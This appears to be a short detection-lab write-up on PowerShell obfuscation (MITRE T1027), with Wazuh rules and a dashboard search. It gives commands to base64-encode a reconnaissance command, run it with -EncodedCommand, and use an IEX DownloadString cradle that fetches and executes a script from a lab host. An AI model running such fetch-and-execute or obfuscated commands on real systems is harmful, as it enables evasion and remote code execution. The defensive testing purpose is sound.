# Attack 04 — PowerShell Obfuscation

## Overview

|Field|Details|
|-|-|
|MITRE ID|T1027|
|Tactic|Defense Evasion|
|Severity|Critical|
|Tool|PowerShell built-in|
|Wazuh Rule|100004 — Level 12|
|Target|Windows 10 VM|

## Commands

### Kali — Serve Test Script

```bash
echo "Get-LocalUser; Get-Process; whoami" > /tmp/test.ps1
cd /tmp \&\& python3 -m http.server 8080
```

### Windows VM — PowerShell as Administrator

```powershell
# Encode command in Base64
$cmd = "Get-LocalUser; Get-Process; whoami"
$enc = \[Convert]::ToBase64String(\[Text.Encoding]::Unicode.GetBytes($cmd))

# Execute encoded command — triggers Rule 100004
powershell.exe -EncodedCommand $enc

# IEX download cradle — triggers Rule 100005
IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.106:8080/test.ps1')
```

## Detection

* **Rule ID:** 100004, 100005 — Level 12
* **EID:** 4104 (Script Block Logging)
* **Dashboard Search:** EncodedCommand OR DownloadString

